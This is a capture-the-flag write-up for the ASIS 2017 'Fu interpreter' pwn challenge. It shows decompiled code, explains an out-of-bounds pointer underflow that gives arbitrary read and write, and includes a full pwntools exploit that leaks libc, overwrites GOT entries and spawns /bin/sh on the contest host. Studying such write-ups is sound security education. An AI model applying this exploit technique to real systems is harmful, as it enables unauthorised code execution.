[](ctf=asis-ctf-quals-2017)
[](type=exploit)
[](tags=brainfuck)
[](tools=pwntools)
[](techniques=GOT overwrite)

# Fu interpreter (pwn-101)

We are given a [file](../fulang_e62955ff8cc20de534a29321b80fa246ddf9763f).

```bash
$ file fulang_e62955ff8cc20de534a29321b80fa246ddf9763f
fulang_e62955ff8cc20de534a29321b80fa246ddf9763f: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=746b0bdb7782ec102b56e6b27507d264920be051, not stripped
$ checksec ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f
[*] '/tmp/fulang_e62955ff8cc20de534a29321b80fa246ddf9763f'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```
The file is not stripped, so the decompilation is quite neat. There are only two functions of interest *main* and *fu_interpreter*.

```c
int fu_interpreter(char a1, char a2)
{
  _BYTE *v2; // ebx@13
  char v3; // dl@15
  signed int result; // eax@20

  if ( a1 == ':' )
  {
    if ( a2 == '<' )
      --fu;
    if ( a2 == '>' )
      ++fu;
    if ( a2 == '+' )
      ++*(_BYTE *)fu;
    if ( a2 == '-' )
      --*(_BYTE *)fu;
    if ( a2 == ':' )
      putchar(*(_BYTE *)fu);
    if ( a2 == '.' )
    {
      v2 = (_BYTE *)fu;
      *v2 = getchar();
    }
    if ( a2 == '_' )
    {
      v3 = (*(_BYTE *)fu)++;
      *(_BYTE *)fu ^= v3;
    }
    if ( a2 == '(' )
      puts("Not implemented yet!");
    if ( a2 == ')' )
      puts("Not implemented yet!");
    result = 1;
  }
  else
  {
    result = 0;
  }
  return result;
}

int main(int argc, const char **argv, const char **envp)
{
  int v4; // edi@6
  signed __int32 i; // [sp+10h] [bp-DCh]@1
  signed __int32 v6; // [sp+14h] [bp-D8h]@1
  char s[4]; // [sp+18h] [bp-D4h]@1
  char v8; // [sp+1Ch] [bp-D0h]@1
  int v9; // [sp+E0h] [bp-Ch]@1
  int *v10; // [sp+E8h] [bp-4h]@1

  fu = (int)&data;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  printf("%s", "[Fulang service]\nEnter your code:");
  fgets(s, 150, stdin);
  v6 = strlen(s);
  for ( i = 0; i < v6; i += 2 )
  {
    if ( !fu_interpreter(s[i], s[i + 1]) )
    {
      puts("Incorrect syntax, RTFM!");
      break;
    }
  }
  return 0;
}
```
The logic is very simple. It takes 150 bytes of brainfuck-like code and then evaluates it. One thing to note is *fu* and *data* are global variables. Array *data* is used as tape for the program to operate but since there are no bounds check on it, we can operate past it.

```bash
$ gdb -q ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f
Loaded 105 commands.  Type pwndbg [filter] for a list.
Reading symbols from ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f...(no debugging symbols found)...done.
pwndbg> p/x &fu
$1 = 0x804a060
pwndbg> p/x &data
$2 = 0x804a080
```
During execution in main current cell position is maintained in *fu* variable and it can be changed with < or >. Since we can have 75 operations max from the brainfuck code, we can control many bytes out of *data*. As we see above the actual *fu* is located only 0x20 bytes from *data*, we can underflow to *fu* and change it to any address such that in the next call of *fu_interpreter* we can gain arbitrary read and write on that address.

Since we now have arbitrary read and write and Partial RELRO, we can leak and patch GOT entries.
The exploitation is quite simple now.
  + First patch GOT['puts'] to main. This way we can reset *fu* on every puts()
  + Leak GOT['__libc_start_main']. We already have the system libc from the hint in the problem. This helps calculating address of system() in libc
  + Call puts() and restart execution to reset *fu*.
  + Patch GOT['strlen'] to libc system address since strlen takes only one param which is the user input, perfect to patch for system()
  + Restart main() again and "/bin/sh"

```python
from pwn import *

context(arch='i386', os='linux', log_level='info')
local = len(sys.argv) == 1
main = 0x80486de

if not local:
	s=remote('69.90.132.40',4001)
	__libc_start_main_base = 0x18540
	system_base = 0x3a940
else:
	s=process('./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f')
	#gdb.attach(s)
	raw_input()
	print hex(u32(s.leak(0x804a020,4)))
	print s.libs()
	__libc_start_main_base = 0x19970
	system_base = 0x3e3e0
p = ":(:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:.:.:>:.:>:.:>:.:>:::>:::>:::>:::>:::>:::>:::>::"
p += ":"*(146-(len(p)))
p += "??" #force puts() to restart main()
s.recvline()
s.send(p)
s.send(":\x1c"+p32(main)) # patch GOT['puts'] to main
s.recvline()
s.recv(4) #leak strlen
__libc_start_main_leak = u32(s.recv(4)) # leak __libc_start_main
libc_base = __libc_start_main_leak - __libc_start_main_base
system = libc_base + system_base
print "leak",hex(__libc_start_main_leak), hex(system)
time.sleep(2)
p = ":<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:.:<:.:>:.:>:.:>:.:>"
p += ":"*(146-(len(p)))
p += "??" #force puts() to restart main()
s.recvline()
s.send(p)

s.send(":\x21"+p32(system)) #patch GOT['strlen'] to system
s.sendline("/bin/sh")
s.interactive()
```


[![asciicast](https://asciinema.org/a/112058.png)](https://asciinema.org/a/112058)
